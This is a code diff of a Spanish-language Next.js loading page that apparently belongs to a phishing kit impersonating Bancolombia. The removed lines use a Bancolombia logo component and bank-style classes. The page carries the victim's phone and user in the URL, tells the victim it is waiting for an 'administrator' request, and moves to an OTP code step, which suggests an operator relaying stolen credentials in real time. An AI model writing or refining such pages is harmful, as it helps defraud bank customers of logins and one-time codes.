@@ -2,20 +2,16 @@
 
 import { useCallback, useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
-import AppLogoBancolombia from "./components/AppLogoBancolombia";
-import AppFooter from "./components/AppFooter";
+import PanelShell from "./components/PanelShell";
+import Footer from "./components/Footer";
 
 export default function LoadingPage({ searchParams }) {
   const router = useRouter();
   const next = searchParams?.next || "waiting";
   const phone = searchParams?.phone || "";
   const user = searchParams?.user || "";
-  const [statusMessage, setStatusMessage] = useState(
-    next === "code"
-      ? "Validando la información del teléfono..."
-      : "Esperando solicitud del administrador..."
-  );
-  const [remainingSeconds, setRemainingSeconds] = useState(3);
+  const [statusMessage, setStatusMessage] = useState("Cargando...");
+  const [remainingSeconds, setRemainingSeconds] = useState(0);
 
   const navigateToCode = useCallback(
     (action = "otp-e", flow = "default") => {
@@ -89,39 +85,29 @@ export default function LoadingPage({ searchParams }) {
   };
 
   return (
-    <>
-      <main className="svp-main">
-        <div className="bc-container-fluid trazo" style={{ backgroundImage: "url(/assets/images/trazo.svg)" }}>
-          <AppLogoBancolombia />
-          <section className="bc-card bc-card-auth bc-card-container" style={{ minWidth: "320px", margin: "3rem auto" }}>
-            <section className="bc-card-auth-body">
-              <section className="bc-card-auth-head" style={{ textAlign: "center" }}>
-                <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">Cargando...</h1>
-                <p className="bc-card-auth-description bc-mt-3">
-                  {next === "code" ? "Validando la información del teléfono..." : "Verificando la solicitud del administrador..."}
-                </p>
-                <p style={{ color: "#fff", marginTop: "0.4rem" }}>
-                  {statusMessage}
-                </p>
-                {next !== "waiting" && (
-                  <p style={{ color: "#a1f0f7", marginTop: "0.2rem" }}>
-                    Tiempo restante: {remainingSeconds} seg
-                  </p>
-                )}
-              </section>
-              <section className="bc-card-auth-button" style={{ display: "grid", gap: "0.75rem", marginTop: "1.5rem" }}>
-                <button type="button" className="bc-button bc-button-fill bc-button-primary" onClick={onContinue}>
-                  Continuar
-                </button>
-                <button type="button" className="bc-button bc-button-outline" onClick={onCancel}>
-                  Cancelar
-                </button>
-              </section>
-            </section>
-          </section>
-        </div>
-      </main>
-      <AppFooter />
-    </>
+    <PanelShell
+      title="Cargando..."
+      subtitle={next === "code" ? "Validando la información del teléfono..." : "Verificando la solicitud del administrador..."}
+      footer={<Footer />}
+      compact
+    >
+      <div style={{ textAlign: "center", display: "grid", gap: "0.6rem" }}>
+        <p style={{ color: "#e0fef9", margin: 0 }}>{statusMessage}</p>
+        {next !== "waiting" && (
+          <p style={{ color: "#a1f0f7", margin: 0 }}>
+            Tiempo restante: {remainingSeconds} seg
+          </p>
+        )}
+      </div>
+
+      <div style={{ display: "grid", gap: "0.75rem", marginTop: "0.75rem" }}>
+        <button type="button" className="bc-button bc-button-fill bc-button-primary" onClick={onContinue}>
+          Continuar
+        </button>
+        <button type="button" className="bc-button bc-button-outline" onClick={onCancel}>
+          Cancelar
+        </button>
+      </div>
+    </PanelShell>
   );
 }
